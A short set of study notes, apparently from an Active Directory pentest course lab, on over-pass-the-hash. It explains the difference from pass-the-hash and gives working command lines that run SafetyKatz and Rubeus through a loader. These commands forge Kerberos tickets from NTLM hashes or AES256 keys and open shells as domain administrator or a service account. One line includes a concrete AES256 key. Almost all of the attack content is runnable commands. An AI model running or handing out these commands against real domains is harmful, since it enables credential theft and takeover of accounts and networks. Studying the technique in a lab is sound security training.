Over Pass the hash (OPTH) generate tokens from hashes or keys - Kerberos only

> [!NOTE] **NOTE**
> Difference between `PTH` and `OPTH` is PTH` `uses local users and `OPTH` uses a domain users credentials to generate tickets and run processes in their context

Over Pass the hash (OPTH) generate tokens from hashes or keys. Needs
elevation 
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::pth /user:administrator /domain: dollarcorp.moneycorp.local/aes256:<aes256keys> /run:cmd.exe" "exit"
```

The above commands starts a process with a logon type 9 (same as runas
/netonly). This means that if you run a `whoami` it will still show as the low priv user, but when you access domain resources it will use the domain administrator credentials.

Rubeus (does not need elevation) - this overwrites your current tickets
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /rc4:<ntlmhash> /ptt
```

Elevation required to create a new process
```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

```